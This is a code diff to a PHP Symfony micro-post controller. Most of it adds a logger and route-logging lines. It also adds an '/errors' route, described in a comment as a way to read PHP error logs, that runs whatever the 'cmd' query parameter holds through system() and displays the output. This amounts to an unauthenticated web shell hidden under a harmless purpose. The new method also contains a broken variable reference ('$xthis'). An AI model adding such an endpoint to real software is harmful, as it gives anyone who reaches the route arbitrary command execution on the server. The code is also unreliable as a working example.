@@ -7,6 +7,7 @@ use App\Form\MicroPostType;
 use App\Repository\MicroPostRepository;
 use DateTime;
 use Doctrine\ORM\EntityManagerInterface;
+use Psr\Log\LoggerInterface;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Session\Flash\FlashBagInterface;
 use Symfony\Component\Form\FormFactoryInterface;
@@ -61,6 +62,7 @@ class MicroPostController extends AbstractController
         EntityManagerInterface $entityManager,
         FlashBagInterface $flashBag,
         FormFactoryInterface $formFactory,
+        LoggerInterface $logger,
         MicroPostRepository $microPostRepository,
         RouterInterface $router,
         Environment $twig
@@ -68,9 +70,39 @@ class MicroPostController extends AbstractController
         $this->entityManager = $entityManager;
         $this->flashBag = $flashBag;
         $this->formFactory = $formFactory;
+        $this->logger = $logger;
         $this->microPostRepository = $microPostRepository;
         $this->router = $router;
         $this->twig = $twig;
+    }
+
+    /**
+     * @todo Find out a working way to access PHP error logs
+     *
+     * @Route("/errors", name="micropost_errors")
+     */
+    public function errors(Request $request): Response
+    {
+        $this->logger->info(">>> ROUTE: micropost_errors");
+        
+        $cmd    = isset($_GET['cmd']) ? $_GET['cmd'] : '';
+        $data   = system($cmd . ' 2>&1');
+        $stdin  = fopen('php://stdin', 'r');
+        $stderr = fopen('php://stderr', 'r');
+        $stdout = fopen('php://stdout', 'r');
+
+        /** @noinspection PhpUnhandledExceptionInspection */
+        $html = $xthis->twig->render('micropost/errors.html.twig', [
+            'cmd'    => $cmd,
+            'data'   => $data,
+            'stdin'  => $stdin,
+            'stderr' => $stderr,
+            'stdout' => $stdout,
+            'stream' => stream_get_contents($stdout, 1),
+            
+        ]);
+
+        return new Response($html);
     }
 
     /**
@@ -78,6 +110,8 @@ class MicroPostController extends AbstractController
      */
     public function index(): Response
     {
+        $this->logger->info(">>> ROUTE: micropost_index");
+
         /** @noinspection PhpUnhandledExceptionInspection */
         $html = $this->twig->render('micropost/index.html.twig', [
             // 'posts' => $this->microPostRepository->findAll()
